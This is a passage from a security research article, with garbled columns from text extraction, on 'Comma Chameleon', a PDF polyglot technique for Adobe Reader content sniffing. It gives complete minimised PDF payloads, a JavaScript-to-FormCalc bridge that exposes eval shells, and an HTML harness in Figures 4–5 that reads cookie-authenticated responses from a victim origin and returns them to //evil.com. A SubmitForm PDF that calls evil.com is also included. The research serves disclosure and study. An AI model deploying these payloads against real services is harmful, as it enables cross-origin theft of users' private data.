versal payload—one that does not need to be altered
for a given endpoint and can be injected in a fire-
and-forget manner—thus no hardcoded URLs, etc.
And thus, the quest for the Comma Chameleon
has started! Why such a name? Read on!
1 CWS[ f l a s h f i l e c o n t e n t s ] ( { " some " : "JSON" , "
r e t u r n e d " : "by" , " t h e " : "API" } )
Since Flash usually ignores any trailing junk
bytes after the Flash file body, this would be run as a
valid SWF file hosted on the example.com domain.
The payload SWF file would be able to issue HTTP
requests to example.com, read the response (for ex-
ample, the actual data returned by the very same
HTTP API, potentially containing some sensitive
user data), and then exfiltrate it to some attacker-
controlled server.
Instead of Flash, our research focuses on PDF
files and methods to make various types of web con-
tent look like valid PDF content. PDF files, when
opened in the browser with the Adobe Reader plu-
gin, are able to issue HTTP requests just like Flash.
The plugin also ignores the response headers when
rendering the PDF; the main challenge is how to
prepare a PDF payload that is immune to leading
and trailing junk bytes, and minimal in file size and
character set size.
We must mention that our research is specific to
Adobe Reader: other PDF plugins usually display
PDFs as passive content without the ability to send
HTTP requests and execute JavaScript in them.
4.3
4.3.1
Minimizing the Payload
To keep the PDF as small as possible, we made it
contain only the bootstrap code and injected all the
rest of the content in an external HTML page from
the attacker’s origin. Size of the final code then
doesn’t matter, and we could focus only on min-
imizing the ‘dropper’ PDF. This required altering
the PDF structure at various layers. Let’s look at
them one by one.
The PDF layer It turns out that for the working
scriptable FormCalc PDF we only need 2 objects.
1. A document catalog, pointing to the
pages (/Pages) and the interactive form
(/AcroForm) with its XFA (XML Forms Ar-
chitecture). There needs to be an OpenAc-
tion dictionary containing the bootstrapping
JavaScript code. The /Pages element may be
empty if the document’s first page will not be
displayed.
Comma Chameleon
2. A stream with the XDP document with the
The existing PoC payloads for PDF-based content
event scripts.
sniffing 16 17 used a FormCalc technique to read and
Here’s an example:
exfiltrate the content. Although they worked, we
quickly noticed that their practicability is limited. 1 %PDF−1.1
They were long (e.g. @irsdl uses > 11 kilobytes) 18
and used large character sets. Servers often rejected, 3 1 0 o b j
<< / Pages << >>
trimmed, or transformed the PDF by escaping some
5
/AcroForm << /XFA 2 0 R >>
of the characters, destroying the chain at the PDF
/ OpenAction <<
parser level. Additionally, those PoCs would not 7
/S / J a v a S c r i p t
/ JS ( { code h e r e } )
work when some data was prepended or appended
>>
to the injected PDF. We wanted a small payload, 9
>>
with a limited character set and arbitrary prefix and 11 e n d o b j
suffix.
16 Alex
Inführ @insertscript, PoC for the FormCalc content exfiltration
pocorgtfo12.pdf CommaChameleon/CrossSiteContentHijacking
Soroush Dalili, JS-instrumented content exfiltration PoC
17 unzip
18
16The JavaScript bootstrap code As JavaScript-
based vectors to read HTTP responses from
the PDF’s origin without user confirmation were
patched by Adobe, FormCalc currently remains the
most convenient way to achieve this. Unfortunately
it cannot be called directly from the embedding
HTML document, and a JavaScript bridge is nec-
essary. In order to script the PDF to enable data
exfiltration, we then need these two bridges:
13 2 0 o b j
<< / Length xxx
15
>>
stream
17 {xdp c o n t e n t h e r e }
endstream
19 e n d o b j
Additionally, a valid PDF trailer is needed, spec-
ifying object offsets in an xref section and a pointer
to the /Root element.
1 xref
0 3
3 0000000000 65535 f
0000000007 00000 n
5 0000000047 00000 n
trailer
7
<< / Root 1 0 R >>
s t a r t x r e f { x r e f o f f s e t h e r e } %%EOF
Further on, the PDF header can be shortened
and modified to avoid detection; e.g., instead of
%PDF-1.1<newline>, one can use %PDF-Q<space>
(we avoid null bytes to keep the character set small).
Similarly, most of the whitespace is unnecessary. For
example, this is valid:
obj <</Pages 2 0 R/AcroForm<</XFA 3 0 R>>/
,→ OpenAction<</S/ J a v a S c r i p t / JS ( code ; )>>>>
,→ e n d o b j
The xref section needs to contain entries for
each of the objects and is rather large (the overhead
is 20 bytes per object); fortunately, non-stream ob-
jects can be inlined and moved to the trailer. The
final example of a minimized PDF looks like this:
1. HTML → PDF JavaScript
2. PDF JavaScript → FormCalc
The first bridge is widely known and docu-
mented. 19
this . disclosed = true ;
2 i f ( t h i s . e x t e r n a l && t h i s . h o s t C o n t a i n e r ) {
f u n c t i o n onMessageFunc ( s t r i n g A r r a y ) {
4
try {
// do s t u f f
6
}
catch ( e ) {
8
}
}
10
f u n c t i o n onErrorFunc ( e ) {
c o n s o l e . show ( ) ;
12
console . println ( e . toString () ) ;
}
14
try {
t h i s . hostContainer . messageHandler =
new O b j e c t ( ) ;
16
t h i s . h o s t C o n t a i n e r . m e s s a g e H a n dl e r .
myPDF = t h i s ;
t h i s . hostContainer . messageHandler .
onMessage = onMessageFunc ;
18
t h i s . h o s t C o n t a i n e r . m e s s a g e H a n dl e r .
o n E r r o r = onErrorFunc ;
t h i s . hostContainer . messageHandler .
onDisclose = function () {
20
return t r u e ;
};
22
}
catch ( e ) {
24
onErrorFunc ( e ) ;
}
26 }
1 %PDF −Q 1 0 obj <</Length 1>>stream
{xdp h e r e } endstream e n d o b j x r e f 0 2
,→ 0000000000 65535 f
0000000007 00000 n
,→ t r a i l e r <</Root<</AcroForm<</XFA 1 0 R>>/
,→ Pages<<>>/OpenAction<</S/ J a v a S c r i p t /JS (
,→ code )>>>>>> s t a r t x r e f { x r e f o f f s e t h e r e }
,→ %%EOF
19 Adobe,
20 Adobe,
This works, but it’s huge.
Fortunately, it
is possible to shorten it a lot.
For example
this.disclosed = true is not needed, and neither
are most of the properties of the messageHandler.
Neither is ‘this’ - hostContainer is visible in
the default scope.
In the end we only need
a messageHandler.onMessage function to pro-
cess messages from the HTML document and a
Cross-scripting PDF content in an Adobe AIR application
JavaScript for Acrobat API Reference
17The XDP In his PoC, 21 @insertScript proposed
the following payload for the XDP with a hardcoded
URL (some wrapping XDP structure has been re-
moved here and below for simplicity):
messageHandler.onDisclose function. From the
documentation: 20
onDisclose — A required method
that is called to determine whether the
host application is permitted to send
messages to the document. This allows
the PDF document author to control the
conditions under which messaging can
occur for security reasons. [...] The
method is passed two parameters cURL
and cDocumentURL [...]. If the method
returns true, the host container is per-
mitted to post messages to the message
handler.
For our purposes we need a function reference
that, when called returns true—or a ‘truth-y’ value
(this is JavaScript, after all!). To save characters,
how about a Date constructor?
1 <xdp : xdp xmlns : xdp=" h t t p : / / ns . adobe . com/xdp/
"> . . .
< f i e l d i d=" H e l l o World ! ">
3
<e v e n t a c t i v i t y=" i n i t i a l i z e ">
< s c r i p t contentType= ’ a p p l i c a t i o n /x
−f o r m c a l c ’>
5
Post ( " h t t p : / / s a m e O r i g i n . com/
i n d e x . html " , "YOUR POST DATA" , " t e x t / p l a i n
" , " u t f −8" , " Content−Type : Dolphin&#x0d;&#
x0a ; Test : AAA" )
</ s c r i p t >
7
</event >
</ f i e l d > . . .
9 </xdp : xdp>
It turns out we don’t need the <field>, as we
can create those dynamically from JavaScript (see
next paragraph). Events can also be triggered dy-
namically, so we don’t need to rely on initialize
and can instead pick an event with the shortest
name, exit. We also define the default XML names-
pace and lose the contentType attribute (FormCalc
is a default value). With these optimizations we’re
down to:
> ! ! Date ( ’ h t t p : / / u r l ’ , ’ h t t p : / / documentUrl ’ )
2 true
In the end, the shortened JS payload is just:
h o s t C o n t a i n e r . m e s s a g e H a n d l e r={ o n D i s c l o s e :
Date , onMessage : f u n c t i o n ( a ) { e v a l ( a [ 0 ] ) } } )
Phew! The whole embedding HTML page can now
use object.postMessage to deliver the 2 nd stage
PDF JavaScript code. We’re looking forward to
Adobe Reader supporting ES5 arrow functions as
that will shorten the payload even more.
1 <xdp xmlns=" h t t p : / / ns . adobe . com/xdp/ "> . . . <
e v e n t a c t i v i t y= ’ e x i t ’><s c r i p t >{{ code
h e r e }}</ s c r i p t ></event> . . . </xdp>
JavaScript → Formcalc bridge In Adobe
Reader it is possible for JavaScript to call Form-
Calc functions. 22 This was used by @irsdl to create
the PoC for the data exfiltration. 18
The communication relies on using the form
fields in the XDP to store input parameters and out-
put value, and triggering the events that would run
the FormCalc scripts. This, again, requires a long
XML payload.
Or does it? Fortunately, the form fields can be
created dynamically by JavaScript and don’t need
to be defined in the XML. Additionally, FormCalc
has the Eval() function — perfect for our purposes.
21 unzip
22 John
pocorgtfo12.pdf CommaChameleon/xfa.zip
Brinkman, Calling FormCalc Functions From JavaScript
18In the end, the JavaScript function (injected
from the HTML) to initialize the bridge is:
1 function initXfa () {
i f ( x f a . form . s ) {
3
// r e f e r s t o <subform name=’ s ’>
s = x f a . form . s ;
5
}
// i f u n i n i t i a l i z e d
7
i f ( s && s . v a r i a b l e s . nodes . l e n g t h == 0 ) {
// i n p u t parameter
9
s . P = x f a . form . c r e a t e N o d e ( " t e x t " , "P" ) ;
// r e t u r n v a l u e
11
s .R = x f a . form . c r e a t e N o d e ( " t e x t " , " r " ) ;
s . v a r i a b l e s . nodes . append ( s . P) ;
13
s . v a r i a b l e s . nodes . append ( s .R) ;
// JS−FormCalc p r o x y
15
s . doEval = f u n c t i o n ( a ) {
s .P. value = a ;
17
s . execEvent ( " e x i t " ) ;
return s .R . v a l u e ;
19
};
}
21 }
23 app . doc . h o s t C o n t a i n e r . m e s s a g e H a n d l e r .
onMessage = f u n c t i o n ( params ) {
try {
25
v a r cmd = params [ 0 ] ;
var r e s u l t = "" ;
27
switch ( cmd ) {
case ’ e v a l ’ : // e v a l i n JS
29
r e s u l t = e v a l ( params [ 1 ] ) ;
break ;
31
case ’ g e t ’ :
// send Get t h r o u g h FormCalc
33
initXfa () ;
r e s u l t = s . doEval (
35
’ Get ( ’ + params [ 1 ] + ’ ) ’ ) ;
break ;
37
}
app . doc . h o s t C o n t a i n e r . p o s t M e s s a g e (
39
[ ’ ok ’ , r e s u l t ] ) ;
} catch ( e ) {
41
app . doc . h o s t C o n t a i n e r . p o s t M e s s a g e (
[ ’ e r r o r ’ , e . message ] ) ;
43
}
};
And the relevant FormCalc event script is simply
r=Eval(P).
Now we have a simple way to get the same-origin
HTTP response from the embedding page’s JS like
this:
o b j e c t . m e s s a g e H a n d l e r . onMessage = c o n s o l e .
l o g . bind ( c o n s o l e ) ;
2 o b j e c t . postMessage ( [ ’ get ’ , u r l ] ) ;
Similarly, we can evaluate arbitrary JavaScript
or FormCalc code by extending the protocol in the
JS code — all without modifying the PDF.
4.3.2
The Final Payload
The final PDF payload for the Comma Chameleon
can be presented in various versions. The first one
is:
%PDF −Q 1 0 obj <</Length 1>>stream
2 <xdp xmlns=" h t t p : / / ns . adobe . com/xdp/ "><
,→ c o n f i g ><p r e s e n t ><pdf><i n t e r a c t i v e >1</
,→ i n t e r a c t i v e ></pdf ></p r e s e n t ></c o n f i g ><
,→ t e m p l a t e ><subform name=" s "><p a g e S e t/><
,→ e v e n t a c t i v i t y=" e x i t "><s c r i p t >r=Eval (P)</
,→ s c r i p t ></event ></subform ></t e m p l a t e ></xdp
,→ > endstream e n d o b j x r e f 0 2 0000000000
,→ 65535 f
0000000007 00000 n t r a i l e r <</
,→ Root<</AcroForm<</XFA 1 0 R>>/Pages<<>>/
,→ OpenAction<</S/ J a v a S c r i p t / JS (
,→ h o s t C o n t a i n e r . m e s s a g e H a n d l e r={ o n D i s c l o s e :
,→ Date , onMessage : f u n c t i o n ( a ) { e v a l ( a [ 0 ] ) } } )
,→ >>>>>> s t a r t x r e f 286 %%EOF
It’s 522 bytes long, using the character set con-
sisting of a space, newline, alphanumerics, and
()[]%-,/.:=<>". The only newline character is re-
quired after the stream keyword, and double quote
characters can be replaced with single quotes if
needed.
The second version utilizes compression and
ASCII stream encoding in order to reduce the char-
acter set (at the expense of size).
%PDF −Q 1 0 obj <</ F i l t e r [ / ASCIIHexDecode /
,→ F l a t e D e c o d e ] / Length 322>>stream
2 789 c 4 d 8 f 4 9 0 e c 2 3 0 0 c 4 5 a f 5 2 7 5 5 3 d 8 d 4 6 2 8 b 9 c e c d 8 2 3
,→ 718234714 b a 4 6 6 5 0 6 2 a a 7 2 7 b 4 c 5 5 8 6 9 5 a 7 f f 9 f 6 d
,→ 5 c 5 d 6 e d 6 3 0 c 7 a a b a 3 b 7 3 3 e 0 3 c 4 d a 1 b 9 7 0 6 e a 6 d 0 a
,→ 2063 e 8 3 4 d a 1 4 4 7 3 f 6 9 c c 8 5 2 a 4 5 9 6 c 4 8 d 1 a 7 d 6 4 2 a
,→ c 6 b 2 5 f 4 8 9 f 1 0 f e 4 b 8 4 4 d 0 1 5 f 0 3 7 c 1 0 4 c 2 1 c f 8 6 4 5
,→ 521 f c 3 9 8 4 a 6 8 a 2 0 9 a 4 d a d a 0 a d 5 4 c 7 4 2 3 0 6 8 d b 4 8 8
,→ a b d 9 6 0 9 e 9 f a a a 3 d 5 b 3 d c 5 1 6 d f 1 9 9 7 5 5 1 9 7 c 5 c c 8 7
,→ e b 1 1 6 1 e f 2 0 6 c 0 e 8 9 3 b 5 5 b 2 d f a 6 f 7 1 b f a 0 5 c 6 7 b 5 3
,→ ec> endstream e n d o b j x r e f 0 2 0000000000
,→ 65535 f
0000000007 00000 n t r a i l e r <</
,→ Root<</AcroForm<</XFA 1 0 R>>/Pages<<>>/
,→ OpenAction<</S/ J a v a S c r i p t /JS<686 f 7 3 7 4 4 3 6 f
,→ 6 e 7 4 6 1 6 9 6 e 6 5 7 2 2 e 6 d 6 5 7 3 7 3 6 1 6 7 6 5 4 8 6 1 6 e 6 4 6 c
,→ 65723 d 7 b 6 f 6 e 4 4 6 9 7 3 6 3 6 c 6 f 7 3 6 5 3 a 4 4 6 1 7 4 6 5 2 c
,→ 6 f 6 e 4 d 6 5 7 3 7 3 6 1 6 7 6 5 3 a 6 6 7 5 6 e 6 3 7 4 6 9 6 f 6 e 2 8 6 1
,→ 297 b6576616c28615b305d297d7d>>>>>>>
,→ s t a r t x r e f 416 %%EOF
19It’s now 732 bytes long, but with a much more
injection-friendly character set: space, alphanums,
one newline, and []<>/-%. The complete HTML
page to initialize the PDF and instrument the data
exfiltration is quite straightforward, shown in Fig-
ure 4.
To start, the runCommaChameleon needs to be
called with the PDF URL and the URL to exfil-
trate. (Both URLs should be from the victim’s ori-
gin.) The whole chain looks like this:
1. Victim browses to //evil.com.
2. //evil.com HTML loads the PDF from //vic-
tim.com into an <object> tag, starting Adobe
Reader.
3. The PDF /OpenAction calls back to the
HTML with its URL.
4. The full code from ‘code’ is sent to the PDF
and is eval-ed by its JavaScript message han-
dler, creating a bridge to FormCalc.
5. HTML sends a URL load instruction
(//victim.com/any-url) to PDF.
6. FormCalc loads the URL (the browser happily
attaches cookies).
7. HTML page gets the response back.
8. //evil.com, having completed the cross-
domain content exfiltration, smiles and fin-
ishes his piña-colada. Fade to black, close cur-
tain.
Just for fun, window.ev and window.formcalc are
also exposed, giving you shells in respectively PDF
JavaScript and its FormCalc engine. Enjoy!
The full PoC is embedded in this PDF. 23
4.3.3
from a target service. It’s possible to construct a
PDF even if there’s both a prefix and a suffix in the
response—the injection point doesn’t need to start
at byte 0, like in Rosetta Flash.
Our payload however allows for even more—it’s
possible to split it into multiple chunks and inter-
leave it with uncontrolled data. For example:
1 {{ A r b i t r a r y p r e f i x h e r e }}
%PDF −Q 1 0 o b j . . . e n d o b j x r e f
... >
3 {{ A r b i t r a r y c o n t e n t h e r e }}
s t a r t x r e f XXX %%EOF
5 {{ A r b i t r a r y s u f f i x h e r e }}
trailer <
The only requirement is for the combined length
of the prefix and suffix to be under 1,000 bytes—all
of that without needing to modify the payload and
recalculate the offsets.
Due to the small character set, the payload can
survive multiple encoding schemes used in various
file formats. Additionally, the PDF format itself al-
lows one to neutralize the content in various ways.
This makes our payload great for applications host-
ing various file types. Let’s take, for example, a
CSV. To exploit the vulnerability, the attacker only
needs to control the first and the last columns over
two consecutive rows, like this:
1 a r t i s t , album , y e a r
David Bowie , David Bowie , 1 9 6 9
3 C u l t u r e Club , Col our by Numbers,%PDF −Q 1 0
obj <<...>> stream
7 8 . . . ec> endstream e n d o b j % , , x r e f . . . %%EOF
5 Madonna , L i k e a V i r g i n , 1 9 8 5
This ASCII encoded version uses neutral-
ized comma characters and is a straightforward
PDF/CSV chameleon, thus proving both the use-
fulness of this payload, and that we’re really bad at
naming things.
Embedding into Other File Formats
The curious reader might notice that, even though
they made a thirty-two second long effort to skip
through most of this gargantuan writeup and even
spotted the PoC section before, there’s still no
clue as to why the whole thing is named “Comma
Chameleon.” As with all current security research,
the name is by far the most important part (it’s not
the nineties anymore!), so now we need to unfold
this mystery!
PDF makes for an interesting target to exploit
plugin-based content sniffing, because the payload
does not need to cover the whole HTTP response
23 unzip
...
4.3.4
Browser Support
Comma Chameleon, just like other payloads used for
MIME sniffing, demonstrates that user-controlled
content should not be served from a sensitive ori-
gin. This one, however is based on Adobe Reader
browser plugin and only works on browsers that sup-
port it—that excludes Chromium-based browsers. 24
MSIE employs a quirky mitigation: rendered PDF
pocorgtfo12.pdf CommaChameleon
Blog, The Final Countdown for NPAPI
24 Chromium
202
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
< s t y l e t y p e=" t e x t / c s s ">
object {
b o r d e r : 5px s o l i d r e d ;
width : 5px ; /∗ make i t t o o s m a l l f o r t h e f i r s t page t o d i s p l a y t o
a v o i d t r i g g e r i n g e r r o r s i n t h e PDF ∗/
h e i g h t : 5px ;
}
</ s t y l e >
<!−− t h i s code w i l l be i n j e c t e d i n t o PDF −−>
< s c r i p t i d=" code " t y p e=" t e x t / t e m p l a t e ">
function initXfa () {
i f ( x f a . form . s ) {
s = x f a . form . s ;
}
i f ( s && s . v a r i a b l e s . nodes . l e n g t h == 0 ) {
s . P = x f a . form . c r e a t e N o d e ( " t e x t " , "P" ) ;
s .R = x f a . form . c r e a t e N o d e ( " t e x t " , " r " ) ;
s . v a r i a b l e s . nodes . append ( s . P) ;
s . v a r i a b l e s . nodes . append ( s . R) ;
s . doGet = f u n c t i o n ( u r l ) {
s . P . v a l u e = " Get ( \ " " + u r l + " \ " ) " ;
s . execEvent ( " e n t e r " ) ;
s . execEvent ( " e x i t " ) ;
return s .R . v a l u e ;
};
s . doEval = f u n c t i o n ( a ) {
s .P. value = a ;
s . execEvent ( " e n t e r " ) ;
s . execEvent ( " e x i t " ) ;
return s .R . v a l u e ;
};
}
}
34
36
38
40
42
44
46
48
50
52
54
56
58
60
app . doc . h o s t C o n t a i n e r . m e s s a g e H a n d l e r . onMessage = f u n c t i o n ( params ) {
try {
v a r cmd = params [ 0 ] ;
var r e s u l t = "" ;
switch ( cmd ) {
case ’ e v a l ’ :
r e s u l t = e v a l ( params [ 1 ] ) ;
break ;
case ’ g e t ’ :
initXfa () ;
r e s u l t = s . doGet ( params [ 1 ] ) ;
break ;
case ’ f o r m c a l c ’ :
initXfa () ;
r e s u l t = s . doEval ( params [ 1 ] ) ;
break ;
default :
throw new E r r o r ( ’ Unknown command ’ ) ;
}
app . doc . h o s t C o n t a i n e r . p o s t M e s s a g e ( [ ’ ok ’ , r e s u l t ] ) ;
} catch ( e ) {
app . doc . h o s t C o n t a i n e r . p o s t M e s s a g e ( [ ’ e r r o r ’ , e . message ] ) ;
}
};
app . doc . h o s t C o n t a i n e r . p o s t M e s s a g e ( [ 1 , app . doc .URL ] ) ; // r e p o r t r e a d i n e s s
</ s c r i p t >
Figure 4 – HTML to init PDF and exiltrate data. Continued in Figure 5.
21< s c r i p t t y p e=" t e x t / j a v a s c r i p t ">
2 f u n c t i o n runCommaChameleon ( p d f U r l , u r l T o E x f i l t r a t e ) {
v a r o b j e c t = document . c r e a t e E l e m e n t ( ’ o b j e c t ’ ) ;
4
( function ( object ) {
var req = f a l s e ;
6
var onload = f u n c t i o n ( ) {
var d r o p I n t e r v a l ;
8
o b j e c t . messageHandler = {
onMessage : f u n c t i o n (m) {
10
i f (m[ 0 ] == 1 ) {
// PDF phoned home .
12
c o n s o l e . l o g ( ’PDF i n i t ok : ’ , m[ 1 ] ) ;
clearInterval ( dropInterval ) ;
14
i f ( ! req ) {
req = true ;
16
// make t h e URL a b s o l u t e
v a r a = document . c r e a t e E l e m e n t ( ’ a ’ ) ;
18
a . href = urlToExfiltrate ;
console . log ( ’ requesting ’ + a . href ) ;
20
o b j e c t . postMessage ( [ ’ get ’ , a . h r e f ] ) ;
// Adding new c o o l f u n c t i o n s .
22
window . ev = f u n c t i o n ( c ) {
o b j e c t . postMessage ( [ ’ e v a l ’ , c ] ) ;
24
};
window . f o r m c a l c = f u n c t i o n ( c ) {
26
o b j e c t . postMessage ( [ ’ formcalc ’ , c ] ) ;
};
28
}
} else {
30
i f (m[ 0 ] == ’ ok ’ ) {
a l e r t (m[ 1 ] ) ;
32
}
c o n s o l e . l o g (m[ 0 ] , m[ 1 ] ) ;
34
}
},
36
o n E r r o r : f u n c t i o n (m, mm) {
c o n s o l e . e r r o r ( " e r r o r : " + m. message ) ;
38
}
};
40
// Keep i n j e c t i n g t h e code i n t o PDF
42
dropInterval = setInterval ( function () {
o b j e c t . p o s t M e s s a g e ( [ document . getElementById ( ’ code ’ ) . t e x t C o n t e n t ] ) ;
44
} , 500) ;
46
48
50
52
};
s e t T i m e o u t ( onload , 1 0 0 0 ) ;
}) ( o b j e c t ) ;
o b j e c t . data = p d f U r l ;
c o n s o l e . l o g ( " Loading " + o b j e c t . data ) ;
o b j e c t . type = ’ a p p l i c a t i o n / pdf ’ ;
document . body . appendChild ( o b j e c t ) ;
54 }
</ s c r i p t >
Figure 5 – Continued from Figure 4.
22files are served from a file:// origin upon content-
type mismatch, breaking the chain. Exploitation
in Firefox is possible, but has limited practicability
because of the default click-to-play settings. 25 As
far as we can tell, Safari remains the most attrac-
tive target. Comma Chameleon, while quite inter-
esting, remains impractical until Adobe decides to
conquer the browser market with its non-NPAPI-
based browser plugin. We are looking forward to
that.
4.4
context of their hosting domain, which means that
they are not useful for our purposes.
4.4.2
For executing JS code, we don’t need a stream ob-
ject. When we combine this fact with the trick to
avoid the newline after the PDF header with a valid
xref, we arrive to this one line PDF file:
1 %PDF −Q x r e f 0 0 t r a i l e r <</Root<</Pages<<>>/
,→ OpenAction<</S/ J a v a S c r i p t /JS <6170702
,→ e 6 1 6 c 6 5 7 2 7 4 2 8 5 5 5 2 4 c 2 9 >>>>>>> s t a r t x r e f
,→ 7%%EOF
The Quest for the One-line PDF
Comma Chameleon uses a relatively small set of
characters, however, there is still one that prevents it
from being useful in numerous injection contexts. It
is the literal newline, since many injection contexts
do not allow literal newlines to appear: for example,
a string inside a JSON API response, a single field
in a CSV file (as opposed to when multiple fields are
controlled), CSS strings, etc.
The perfect PDF injection payload would be a
one line PDF that is still able to: issue HTTP re-
quests, read the response, and exfiltrate the data.
Since JSON API responses contain partially user-
controlled data in many cases, and a large portion
of them only escape characters that are absolutely
necessary to escape (like newlines), a one-line PDF
would suddenly make a huge number of APIs vul-
nerable, even more than the Rosetta Flash vulnera-
bility.
As it turns out, constructing such a PDF is hard.
The reason for this is that newlines play a crucial
role in the PDF file structure: the PDF header has
to be followed by a newline, and every stream must
be defined by a ‘stream’ keyword followed by a new-
line and then the data.
As described in previous sections, the newline in
the header can be omitted when there’s a valid xref
and a trailer. However, there is no known way to
define stream objects without newlines.
We have partially overcome this problem. We’ll
present our solutions and the dead ends we’ve ex-
plored in the next few sections, to give other re-
searchers a solid foundation to start on.
4.4.1
This PDF is immune to leading and trailing junk
bytes, opens without any warning popup in Adobe
Reader, and opens an alert window with the doc-
ument’s URL from JavaScript. Note that there’s
necessary space character after the EOF sign.
Referencing an External Flash File
External Flash files can be referenced without using
stream objects. However, they are run within the
25 Mozilla
Executing JavaScript
Security Blog, Putting Users in Control of Plugins
23Now the logical next step would be to find an
Adobe Reader JavaScript API that allows us to is-
sue HTTP requests. Unfortunately, all of the docu-
mented APIs that would allow reading the response
require the user’s consent.
4.4.3
requires newlines regardless. This is because there’s
no way to define them without at least one stream
object, and stream objects cannot be defined with-
out newlines.
After this dead end, we tried to find other ways
to dynamically add content to a displayed PDF. One
of the results of this search is Forms Data Format
(FDF).
Dynamically Creating an Embedded
Flash File from JavaScript
Without a direct HTTP API, we are left with two
options: to dynamically create either an embedded
Flash file or a form with FormCalc. After read-
ing through the Adobe JS API reference 20 a few
times, we determined that creating a form dynami-
cally is not possible, at least not in any documented
way. On the other hand, it seemed like dynamically
adding an embedded Flash object may be possible.
This technique is made possible by an API that
allows the JS to manipulate a 3D scene. One of the
possible modifications is adding a texture to a sur-
face. The texture can be an image, or even a video.
In the case of video, Flash “movies” are also sup-
ported. At this point, you might wonder why Adobe
implemented rendering embedded Flash movies in a
3D scene in a PDF file displayed in a browser. It’s
something we’d also like to know, but now let’s con-
tinue exploring the potential and limitations of this
feature.
The data for the Flash movie needs to be spec-
ified as a Data object (in this case, that means a
JavaScript object of type Data, not a PDF object).
Data objects represent a buffer of arbitrary binary
data. These objects can be obtained from file at-
tachments, but to have file attachments, we need
streams again—so that’s not an option. Another way
to create a Data object is the createDataObject
API. But according to the reference, this function
can be called only by signed PDFs with file attach-
ment “usage rights,” or when opening the PDF in
Adobe Pro. The only way to sign a PDF and add file
attachment usage right is using Adobe’s LiveCycle
Reader Extensions product. As we’re life-long sup-
porters of the free software movement, we ruled out
paying for a signature, and limiting the payload to
Adobe Pro users is a very tight constraint we didn’t
want to add.
Next, we found a way to dynamically create Data
objects in Adobe Reader without a signature, but
also came to the conclusion that creating a 3D scene
4.4.4
Using Forms Data Format to Load Ad-
ditional Content
FDF 26 and its XML based version, XML Forms
Data Format (XFDF) 27 are a file format and a re-
lated technology, that are meant to enable rich PDF
forms to send the contents of a PDF form to a re-
mote server and to update the appearance of the
PDF based on the server’s response. For our pur-
poses, the important part is updating the PDF. This
could enable us to implement a minimal form sub-
mission logic in the payload PDF. That logic would
submit the form to the attacker server without any
data and then augment the payload PDF using the
server’s response. The update received from the
server would add embedded Flash, 3D scene, or
FormCalc code to the PDF, which would then carry
out the rest of the work.
The first step is having a first stage PDF that
submits the form. Fortunately, this can be achieved
without user interaction in a really compact way,
without even using JavaScript:
1 %PDF−1.7 1 0 obj <</Pages 1 0 R/ OpenAction<</
,→ S/SubmitForm/F( h t t p : // e v i l . com/ x . f d f#FDF)
,→ >>>>e n d o b j x r e f 0 2 0000000000 65535 f
,→ 0000000009 00000 n t r a i l e r <</Root 1 0 R
,→ >> s t a r t x r e f 98 %%EOF
As a security check, 28 Adobe Reader will down-
load the evil.com/crossdomain.xml file, which is a
essentially a whitelist of domains, and check whether
the submitting PDF’s domain is in the whitelist.
This is not a problem, since this file is controlled
by us, and we can add the victim’s domain in the
whitelist. Also, there’s an additional constraint:
the Content-Type of the response must be exactly
application/vnd.fdf.
According to the documentation, FDF supports
the augmentation of the original PDF in many dif-
ferent ways:
26 Adobe,
Portable Document Format ISO standard, Section 12.7.7
XML Forms Data Format Specification
28 Adobe, Acrobat Application Security Guide, 4.5.1
27 Adobe,
24• Updating existing form fields
PDF is never loaded with the original PDF’s secu-
rity context. Instead, it’s saved to a temporary file
first and then opened outside the web browser.
• Adding new pages
• Adding new annotations
4.4.5
• Adding new JavaScript code
The End of the Road?
The PDF file format has a huge set of features, es-
pecially if we consider the JavaScript API, Form-
Calc, XFDF, other companion specifications, and
Adobe’s proprietary extensions. Many of these fea-
tures are under-specified, under-documented, and
rarely used in practice, so that it’s often impossi-
ble to find a working example. In addition to that,
PDF reader implementations (even Adobe’s own Ac-
robat Reader) often deviate from the specification in
subtle ways.
In the end, it’s not really possible to have a com-
plete picture of what PDF files can do. We believe
that a one line payload is doable; we just didn’t find
a way to create one. We encourage others to take a
look and share the results!
At a first glance, this feature set looks more than suf-
ficient to achieve our goal. Adding new JavaScript
code is the easiest. The required FDF file looks like
this:
1 %FDF−1.2
1 0 obj
3 << /FDF << / J a v a S c r i p t << /Doc [ ( ) ( app .
a l e r t ( 4 2 ) ; ) ] >> >> >>
endobj
5 trailer
<< / Root 1 0 R >>
7 %%EOF
However, adding new JS code to the document is
not really useful, since we already have JS execu-
tion with a one line PDF.
Adding new pages seems useful, but it turns out
that this only adds the page itself, not the additional
annotations attached to the page, like Flash or 3D
scenes. Also, XFA forms with FormCalc are not de-
fined inside pages, but at the document level, so the
ability to add pages doesn’t mean that we can add
pages with forms in them.
The situations with updating existing form fields
is similar: the only interesting part of that API is
the ability to draw a page from an external PDF to
an existing button as background. It has the same
limitations as adding pages: only the actual page
graphics will be imported, without annotations or
forms.
Adding annotations is the most promising, since
Flash files, 3D scenes, attachments are all annota-
tions. According to the documentation, there are
unsupported annotation types, but Flash and 3D
are not among them. In practice, however, they just
don’t work. The only interesting type of annotation
that is possible to add is file attachments.
File attachments are useful for two reasons.
First, they provide references to their Data objects,
which means that we now have a way to create these
objects without a signature. Secondly, they might
contain embedded PDF files. There are several dif-
ferent ways to open an embedded PDF added with
FDF, but the problem in this case is that the new
4.5
Unexplored Areas
So far our goal has been to construct a PDF that
is able to read and exfiltrate data from the hosting
domain through HTTP requests. In this section, we
will enumerate a few other interesting scenarios that
we didn’t explore in depth, but that may enable by-
passing some other web security features with PDFs.
If the goal is to exfiltrate just the document in
which the injection occurs, then PDF forms might
come handy. If there are two injection points, one
could construct a PDF where the data between the
injection points becomes the content of a form field.
This form can then be submitted, and the content
of the field can be read. When there is one injec-
tion point, it’s possible to set a flag on PDF forms
that instructs the reader to submit the whole PDF
file as is, which, in this case, includes the content to
be exfiltrated. We weren’t able to get this to work
reliably, but with some additional work, this could
be a viable technique.
This technique might be usable in other PDF
readers, like modern browsers’ built-in PDF plug-
ins. It would also be interesting to have a look at
the API surface these PDF readers expose, but we
didn’t have the resources to have a deeper look into
these yet.
Content Security Policy is a protection mecha-
nism that can be used to prevent turning an HTML
injection into XSS, by limiting the set of scripts
25the page is allowed to run. In other words, when
an effective CSP is in place, it is impossible to
run attacker-provided JavaScript code in the HTML
page, even if the attacker has partial control over the
HTML code of the page through an injection. Adobe
Reader ignores the CSP HTTP header and can be
forced to interpret the page as PDF with embed-
